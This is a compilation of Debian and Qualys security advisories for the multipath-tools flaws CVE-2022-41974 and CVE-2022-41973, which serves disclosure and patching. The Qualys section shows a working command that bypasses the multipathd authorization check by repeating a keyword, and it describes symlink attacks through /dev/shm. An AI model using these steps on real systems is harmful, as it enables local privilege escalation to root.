    CVE-2022-41973. Local users able to write to UNIX domain sockets can
    bypass access controls and manipulate the multipath setup. This can lead
    to local privilege escalation to root. This occurs because an attacker
    can repeat a keyword, which is mishandled because arithmetic ADD is used
    instead of bitwise OR.

For Debian 10 buster, these problems have been fixed in version
0.7.9-3+deb10u2.

We recommend that you upgrade your multipath-tools packages.

For the detailed security status of multipath-tools please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/multipath-tools>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpcgabv00782.pgp)**

*Description:* PGP signature

---



=== Content from www.debian.org_2395176f_20250114_193147.html ===


---

[[Date Prev](msg00054.html)][[Date Next](msg00056.html)]
[[Thread Prev](msg00054.html)][[Thread Next](msg00056.html)]
[[Date Index](maillist.html#00055)]
[[Thread Index](threads.html#00055)]

# [SECURITY] [DSA 5366-1] multipath-tools security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5366-1] multipath-tools security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Wed, 01 Mar 2023 11:29:12 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1pXKe0-004WPG-9V%40seger.debian.org) [E1pXKe0-004WPG-9V@seger.debian.org](msg00055.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5366-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso
March 01, 2023                        <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : multipath-tools
CVE ID         : CVE-2022-41973 CVE-2022-41974
Debian Bug     : 1022742

The Qualys Research Labs reported an authorization bypass
(CVE-2022-41974) and a symlink attack (CVE-2022-41973) in
multipath-tools, a set of tools to drive the Device Mapper multipathing
driver, which may result in local privilege escalation.

Please refer to /usr/share/doc/multipath-tools/NEWS.Debian.gz for
backwards-incompatible changes in this update.

For the stable distribution (bullseye), these problems have been fixed in
version 0.8.5-2+deb11u1.

We recommend that you upgrade your multipath-tools packages.

For the detailed security status of multipath-tools please refer to its
security tracker page at:
<https://security-tracker.debian.org/tracker/multipath-tools>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmP/NuFfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0RyiQ//VY70yfm+KRaOehk7p4ek9uc2PY/ezIyGp29CijJBjugxR1+C1NEDahES
QUv/b1D9UsLDy+lKCRIoQAfpQ7cZd9GlVNJYNBCvSxIVjqNkj8WDkZdVOqNgE+mr
Orl8w3szGVQtuFplG5q/5Q5kNzcJ9kKNRnuD33+UqpN88h2/HfxBLJzDJNf28HT6
axpdCh48QYuk8k5M1Ns6ciguMQUG3nG9yFyrHrKkUQZTjqY3bqN+J56JpBqCKUt9
QWryP3O2DzLEQR+ZY1zdoZw9X517vS8vb7j+22qy4jCNkZeUcaefIinSEOtI7Vto
usSCcWUSfpyUDAD0VJswG7kftOo6VCVjujpdEDFMuUpFBAuwbbCR5e15Xw1+yIYE
A6uIKw9bvZWqyTPZ13Yq3wH8qdXXjevH4xkHqWFeokAZ7Y0TrLHOiqnItbKOWX/k
bhBVl/V47EVPnKleIk4PYIcB/6yFpgK7ujX6z8JMCFLGaEv2E8spJBZUOBsFTc2z
9GhOi5BGbLKr6rsgGeuCI9ELsbREIDr/I9etWlTr6xjSCln5r66ZyHquarG4pj+K
OYs8GqLMwBNTcB/ZMngZZO+hGjOhSQGIYIDPwb28dgLFGQo1ADP7TWUtSkqYQ6LT
m3jiUKLqwYRmwEN9vKrfZo9HTqMTtsNPzxqCoX3/3V/XNYFI8WM=
=d6k/
-----END PGP SIGNATURE-----

```

---



=== Content from www.openwall.com_57ca9181_20250114_193137.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20221024151432.GA28853@localhost.localdomain>
Date: Mon, 24 Oct 2022 15:15:25 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Authorization bypass and symlink attack in multipathd (CVE-2022-41974
 and CVE-2022-41973)

Qualys Security Advisory

Leeloo Multipath: Authorization bypass and symlink attack in multipathd
(CVE-2022-41974 and CVE-2022-41973)

========================================================================
Contents
========================================================================

Summary
CVE-2022-41974: Authorization bypass
CVE-2022-41973: Symlink attack
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

We discovered two local vulnerabilities (an authorization bypass and a
symlink attack) in multipathd, a daemon that is running as root in the
default installation of (for example) Ubuntu Server:

<https://ubuntu.com/server/docs/device-mapper-multipathing-introduction>
<https://github.com/opensvc/multipath-tools>

We combined these two vulnerabilities with a third vulnerability, in
another package that is also installed by default on Ubuntu Server, and
obtained full root privileges on Ubuntu Server 22.04; other releases are
probably also exploitable. We will publish this third vulnerability, and
the complete details of this local privilege escalation, in an upcoming
advisory.

The authorization bypass (CVE-2022-41974) was introduced in February
2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check
on IPC commands"), but earlier versions perform no authorization checks
at all: any unprivileged local user can issue any privileged command to
multipathd.

The symlink attack (CVE-2022-41973) was introduced in May 2018 (version
0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in
/dev/shm"); the vulnerable code was hardened significantly in May 2020
(version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it
remains exploitable nonetheless.

========================================================================
CVE-2022-41974: Authorization bypass
========================================================================

The multipathd daemon listens for client connections on an abstract Unix
socket (conveniently, the multipathd binary itself can act as a client,
if executed with non-option arguments; we use this feature extensively
in this advisory to connect and send commands to the multipathd daemon):

------------------------------------------------------------------------
$ ps -ef | grep 'multipath[d]'
root         377       1  0 13:55 ?        00:00:00 /sbin/multipathd -d -s

$ ss -l -x | grep 'multipathd'
u_str LISTEN 0      4096        @/org/kernel/linux/storage/multipathd 18105
------------------------------------------------------------------------

The commands sent by a client to multipathd are composed of keywords,
and internally, each keyword is identified by a different bit; for
example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which
requires a parameter) is 65536 (1<<16):

------------------------------------------------------------------------
155 load_keys (void)
...
163         r += add_key(keys, "list", LIST, 0);
164         r += add_key(keys, "show", LIST, 0);
165         r += add_key(keys, "add", ADD, 0);
...
183         r += add_key(keys, "path", PATH, 1);
------------------------------------------------------------------------
 53 #define LIST            (1ULL << __LIST)
 54 #define ADD             (1ULL << __ADD)
 ..
 69 #define PATH            (1ULL << __PATH)
------------------------------------------------------------------------
  6 enum {
  7         __LIST,                 /*  0 */
  8         __ADD,
 ..
 23         __PATH,
------------------------------------------------------------------------

In turn, each command is associated with a handler (a C function) by its
fingerprint -- the bitwise OR of its constituent keywords; for example,
the command "list path PARAM" is associated with cli_list_path() by the
fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM"
is associated with cli_add_path() by the fingerprint 65538
(ADD+PATH=2+65536):

------------------------------------------------------------------------
1522 void init_handler_callbacks(void)
....
1527         set_handler_callback(LIST+PATH, cli_list_path);
....
1549         set_handler_callback(ADD+PATH, cli_add_path);
------------------------------------------------------------------------
321 static uint64_t
322 fingerprint(const struct _vector *vec)
...
325         uint64_t fp = 0;
...
331         vector_foreach_slot(vec, kw, i)
332                 fp += kw->code;
333
334         return fp;
------------------------------------------------------------------------
 89 static struct handler *
 90 find_handler (uint64_t fp)
 ..
 95         vector_foreach_slot (handlers, h, i)
 96                 if (h->fingerprint == fp)
 97                         return h;
 98
 99         return NULL;
------------------------------------------------------------------------

When multipathd receives a command from a client, it first performs an
authentication check and an authorization check (both at line 491):

------------------------------------------------------------------------
431 static int client_state_machine(struct client *c, struct vectors *vecs,
...
485         case CLT_PARSE:
486                 c->error = parse_cmd(c);
487                 if (!c->error) {
...
491                         if (!c->is_root && kw->code != LIST) {
492                                 c->error = -EPERM;
...
495                         }
496                 }
497                 if (c->error)
...
501                 else
502                         set_client_state(c, CLT_WORK);
...
522         case CLT_WORK:
523                 c->error = execute_handler(c, vecs);
------------------------------------------------------------------------

- Authentication: if the client's UID (obtained from SO_PEERCRED) is 0
  (i.e., if is_root is true), then the client is privileged; otherwise,
  it is unprivileged.

- Authorization: if the client is privileged, it is allowed to execute
  any commands; otherwise, only unprivileged LIST commands are allowed
  (i.e., commands whose first keyword is either "list" or "show").

Attentive readers may have noticed that multipathd does not, in fact,
calculate the fingerprint of a command by bitwise-ORing its constituent
keywords, but by arithmetic-ADDing them (at line 332). While these two
operations are equivalent if no keyword is repeated, we (attackers) can
send a seemingly unprivileged command (whose first keyword is "list")
but whose fingerprint matches a privileged command (by repeating the
"list" keyword): we can exploit this flaw to bypass multipathd's
authorization check.

For example, we are not allowed to execute "add path PARAM" (whose
fingerprint is 2+65536=65538) because the first keyword is not "list",
but we are allowed to execute the equivalent "list list path PARAM"
(whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537)
because the first keyword is "list" (the multipathd daemon below replies
"blacklisted" because PARAM is an invalid path, not because the command
is denied):

------------------------------------------------------------------------
$ multipathd add path PARAM
permission deny: need to be root

$ multipathd list list path PARAM
blacklisted
------------------------------------------------------------------------

This authorization bypass greatly enlarges the attack surface of
multipathd: 34 privileged command handlers become available to local
attackers, in addition to the 23 unprivileged command handlers that are
normally available. We audited only a few of these command handlers,
because we quickly discovered a low-hanging vulnerability (a symlink
attack) in one of them.

========================================================================
CVE-2022-41973: Symlink attack
========================================================================

multipathd operates insecurely, as root, in /dev/shm (a sticky,
world-writable directory similar to /tmp). The vulnerable code (in
mark_failed_wwid()) may be executed during the normal lifetime of
multipathd, but a local attacker can force its execution by exploiting
the authorization bypass CVE-2022-41974; for example, by adding a
"whitelisted, unmonitored" device to multipathd:

------------------------------------------------------------------------
$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail
------------------------------------------------------------------------

This command, which is equivalent to "add path sda1", results in the
following system-call trace (strace) of the multipathd daemon:

------------------------------------------------------------------------
386 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = -1 ENOENT (No such file or directory)
387 mkdir("/dev", 0700)                     = -1 EEXIST (File exists)
388 mkdir("/dev/shm", 0700)                 = -1 EEXIST (File exists)
389 mkdir("/dev/shm/multipath", 0700)       = 0
390 mkdir("/dev/shm/multipath/failed_wwids", 0700) = 0
391 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = 12
392 getpid()                                = 375
393 openat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", O_RDONLY|O_CREAT|O_EXCL, 0400) = 13
394 close(13)                               = 0
395 linkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 12, "VBOX_HARDDISK_VB60265ca5-df119cb6", 0) = 0
396 unlinkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 0) = 0
397 close(12)                               = 0
------------------------------------------------------------------------

- at line 389, the directory "/dev/shm/multipath" is created, if it does
  not exist already;

- at line 390, the directory "/dev/shm/multipath/failed_wwids" is
  created, if it does not exist already;

- at lines 391-397, the empty file
  "/dev/shm/multipath/failed_wwids/VBOX_HARDDISK_VB60265ca5-df119cb6" is
  created, if it does not exist already (its name is the "World Wide ID"
  of the added device).

multipathd is therefore vulnerable to two different symlink attacks:

1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath",
then we can create a directory named "failed_wwids" (user root, group
root, mode 0700) anywhere in the filesystem;

2/ if we create an arbitrary symlink "/dev/shm/multipath/failed_wwids",
then we can create a file named "VBOX_HARDDISK_VB60265ca5-df119cb6"
(user root, group root, mode 0400, size 0) anywhere in the filesystem.

These two symlink attacks are very weak, because we do not control the
name, user, group, mode, or contents of the directory or file that we
create; only its location. Despite these limitations, we were able to
combine multipathd's vulnerabilities (authorization bypass and symlink
attack) with a third vulnerability (in another package), and obtained
full root privileges on Ubuntu Server 22.04; we will publish this third
vulnerability in an upcoming advisory.

Side note: initially, we thought that the symlink attack 1/ would fail,
because /dev/shm is a sticky world-writable directory, and the kernel's
fs.protected_symlinks is 1 by default; to our great surprise, however,
it succeeded. Eventually, we understood that only the final component of
a path is protected, not its intermediate components; for example, if
/tmp/foo is a symlink, then an access to /tmp/foo itself is protected,
but an access to /tmp/foo/bar is not. Interestingly, this weakness was
already pointed out in 2017 by Solar Designer, and the original
Openwall, grsecurity, and Yama protections are not affected:

<https://www.openwall.com/lists/kernel-hardening/2017/06/06/74>

========================================================================
Acknowledgments
========================================================================

We thank Martin Wilck and Benjamin Marzinski for their hard work on this
release, and the SUSE Security Team for their help with this disclosure.
We also thank the members of linux-distros@...nwall.

========================================================================
Timeline
========================================================================

2022-08-24: Advisory sent to security@...e.

2022-10-10: Advisory and patches sent to linux-distros@...nwall.

2022-10-24: Coordinated Release Date (15:00 UTC).

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.fedoraproject.org_b6d0f238_20250114_193145.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
